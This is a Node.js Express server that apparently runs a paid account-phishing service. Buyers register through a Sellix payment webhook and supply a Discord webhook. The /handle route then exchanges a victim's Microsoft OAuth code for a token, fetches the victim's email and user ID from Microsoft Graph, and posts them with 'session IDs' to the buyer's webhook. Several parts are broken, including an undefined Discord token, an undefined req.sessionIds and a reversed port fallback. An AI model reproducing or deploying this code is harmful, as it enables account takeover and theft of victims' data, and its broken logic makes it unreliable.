const axios = require("axios");
const express = require("express");
const { MongoClient } = require("mongodb");

const config = {
  azure: {
    client_secret: "",
    client_id: ""
  },
  mongo: {
    connectionString: ""
  },
  site: {
    handleDomain: "",
    loginLive: ""
  },
  admin: {
    password: ""
  },
  telegram: "",
  coupon: ""
};

const app = express();
app.use(express.json());

const client = new MongoClient(config.mongo.connectionString, {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

app.post("/sellixhk", async (req, res) => {
  res.setHeader("Content-Type", "application/json");

  try {
    const webhook =
      req.body.data.custom_fields[
        "Discord webhook URL (The session ids will be sent here)"
      ];
    const apiKey =
      req.body.data.custom_fields[
        "API key (Please make it unique, it's used to identify you)"
      ];

    addUser(apiKey, webhook);
    welcome(webhook, apiKey);
    res.status(200).send("OK");
    console.log("New user added: " + apiKey);
  } catch (e) {
    console.log(e);
    res.status(500).send("Error");
  }
});

app.get("/add", (req, res) => {
  const compulsoryParams = ["apiKey", "webhook", "password"];
  for (let i = 0; i < compulsoryParams.length; i++) {
    if (req.query[compulsoryParams[i]] === undefined) {
      res
        .status(400)
        .send("Missing compulsory parameter: " + compulsoryParams[i]);
      return;
    }
  }

  if (req.query.password !== config.admin.password) {
    res.status(401).send("Invalid password");
    return;
  }

  try {
    addUser(req.query.apiKey, req.query.webhook);
    res.send("User added successfully");
  } catch (err) {
    res.status(400).send("User already exists");
  }

  welcome(req.query.webhook, req.query.apiKey);
});

let bannedIps = [];

app.get("/handle", (req, res) => {
  if (req.query.code === undefined) {
    res.status(400).send("Missing compulsory parameter: code");
    return;
  }

  if (req.query.state === undefined) {
    res.status(400).send("Missing compulsory parameter: state");
    return;
  }

  getWebhook(req.query.state).then((webhook) => {
    if (webhook == null) {
      res.status(400).send("Invalid API key");
      return;
    } else {
      res.status(200).send("Success");
      console.log("Got webhook: " + webhook);
      const ip = getIp(req);

      if (bannedIps.includes(ip)) {
        console.log("Banned IP tried to login: " + ip);
        return;
      }

      bannedIps.push(ip);
      setTimeout(() => {
        bannedIps.splice(bannedIps.indexOf(ip), 1);
      }, 1000 * 60 * 15);

      handleRequest(req.query.code, webhook, config.site.handleDomain, req);
    }
  });
});

createCollection();

app.listen(8080 || process.env.PORT, () => {
  console.log("Server started!");
});

// MONGO

async function createCollection() {
  try {
    await client.connect();
    const database = client.db("apiKeys");
    const collection = database.collection("apiKeys");
    await collection.createIndex({ apiKey: 1 }, { unique: true });
    console.log("Connected to MongoDB");
  } catch (err) {
    console.error(err);
  }
}

async function addUser(apiKey, webhook) {
  const database = client.db("apiKeys");
  const collection = database.collection("apiKeys");
  try {
    await collection.insertOne({ apiKey: apiKey, webhook: webhook });
  } catch (err) {
    throw new Error("User already exists");
  }
}

async function getWebhook(apiKey) {
  const database = client.db("apiKeys");
  const collection = database.collection("apiKeys");
  const result = await collection.findOne({ apiKey: apiKey });
  return result ? result.webhook : null;
}

// HANDLE

async function handleRequest(code, webhook, handleDomain, req) {
  const url = `https://login.microsoftonline.com/common/oauth2/v2.0/token`;

  const params = new URLSearchParams();
  params.append("client_id", config.azure.client_id);
  params.append("client_secret", config.azure.client_secret);
  params.append("code", code);
  params.append("grant_type", "authorization_code");
  params.append("redirect_uri", config.site.loginLive);

  try {
    const response = await axios.post(url, params);
    const accessToken = response.data.access_token;
    const headers = {
      Authorization: `Bearer ${accessToken}`
    };

    const { data } = await axios.get(
      `https://graph.microsoft.com/v1.0/me`,
      {
        headers: headers
      }
    );

    const userId = data.id;
    const email = data.mail || data.userPrincipalName;
    const sessionIds = JSON.stringify(req.sessionIds);

    axios.post(webhook, {
      content: `User with email ${email} and ID ${userId} has logged in!\nSession IDs: ${sessionIds}`
    });
  } catch (error) {
    console.error(error);
  }
}

// WELCOME

async function welcome(webhook, apiKey) {
  const url = `https://discord.com/api/v10/webhooks/${webhook}`;

  try {
    const response = await axios.get(url);
    const serverId = response.data.guild_id;
    const channelId = response.data.channel_id;

    axios.post(
      `https://discord.com/api/v10/guilds/${serverId}/welcome-screen`,
      {
        enabled: true,
        welcome_channels: [
          {
            channel_id: channelId,
            description: "Welcome to the server!",
            emoji_id: "",
            emoji_name: ""
          }
        ]
      },
      {
        headers: {
          Authorization: `Bot ${config.discord.token}`
        }
      }
    );

    axios.post(
      `https://discord.com/api/v10/guilds/${serverId}/members/${apiKey}/screen/welcome`,
      {},
      {
        headers: {
          Authorization: `Bot ${config.discord.token}`
        }
      }
    );
  } catch (error) {
    console.error(error);
  }
}
